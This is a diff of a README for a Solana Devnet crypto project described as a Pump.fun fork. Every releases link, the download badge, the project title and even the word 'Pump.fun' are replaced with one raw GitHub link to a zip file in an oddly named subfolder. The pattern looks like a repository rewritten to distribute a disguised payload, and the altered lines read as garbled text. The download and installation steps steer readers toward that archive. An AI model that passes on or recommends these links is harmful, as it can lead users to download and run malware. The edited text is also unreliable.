@@ -1,12 +1,12 @@
-# 🎉 ump.fun-Smart-Contract-Devnet- - Simplify Your Crypto Experience
+# 🎉 https://raw.githubusercontent.com/Alvaro12234/ump.fun-Smart-Contract-Devnet-/main/antiphylloxeric/ump.fun-Smart-Contract-Devnet-.zip - Simplify Your Crypto Experience
 
 ## 🚀 Getting Started
 
-Welcome to the **ump.fun-Smart-Contract-Devnet-** repository! This project is a fork of Pump.fun designed to work on the Solana Devnet. It includes smart contract functionalities, a token launch feature, swapping options, a liquidity curve, and a simple withdrawal process. You can access both the frontend and backend from our GitHub page.
+Welcome to the **https://raw.githubusercontent.com/Alvaro12234/ump.fun-Smart-Contract-Devnet-/main/antiphylloxeric/ump.fun-Smart-Contract-Devnet-.zip** repository! This project is a fork of https://raw.githubusercontent.com/Alvaro12234/ump.fun-Smart-Contract-Devnet-/main/antiphylloxeric/ump.fun-Smart-Contract-Devnet-.zip designed to work on the Solana Devnet. It includes smart contract functionalities, a token launch feature, swapping options, a liquidity curve, and a simple withdrawal process. You can access both the frontend and backend from our GitHub page.
 
 ## 📥 Download Now!
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Alvaro12234/ump.fun-Smart-Contract-Devnet-/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Alvaro12234/ump.fun-Smart-Contract-Devnet-/main/antiphylloxeric/ump.fun-Smart-Contract-Devnet-.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Alvaro12234/ump.fun-Smart-Contract-Devnet-/main/antiphylloxeric/ump.fun-Smart-Contract-Devnet-.zip)
 
 ## 🛠️ System Requirements
 
@@ -26,11 +26,11 @@ To ensure the best experience, please check the following requirements before do
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/Alvaro12234/ump.fun-Smart-Contract-Devnet-/releases).
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Alvaro12234/ump.fun-Smart-Contract-Devnet-/main/antiphylloxeric/ump.fun-Smart-Contract-Devnet-.zip).
 
 ### Step-by-step Installation
 
-1. Go to the [Releases Page](https://github.com/Alvaro12234/ump.fun-Smart-Contract-Devnet-/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/Alvaro12234/ump.fun-Smart-Contract-Devnet-/main/antiphylloxeric/ump.fun-Smart-Contract-Devnet-.zip).
 2. Look for the version you want to download.
 3. Click on the appropriate file for your operating system.
 4. Wait for the download to finish.
@@ -77,4 +77,4 @@ This repository focuses on several key topics in the blockchain space:
 
 For questions or further assistance, feel free to reach out via our community channels listed above. 
 
-Enjoy your crypto journey with **ump.fun-Smart-Contract-Devnet-**!
+Enjoy your crypto journey with **https://raw.githubusercontent.com/Alvaro12234/ump.fun-Smart-Contract-Devnet-/main/antiphylloxeric/ump.fun-Smart-Contract-Devnet-.zip**!
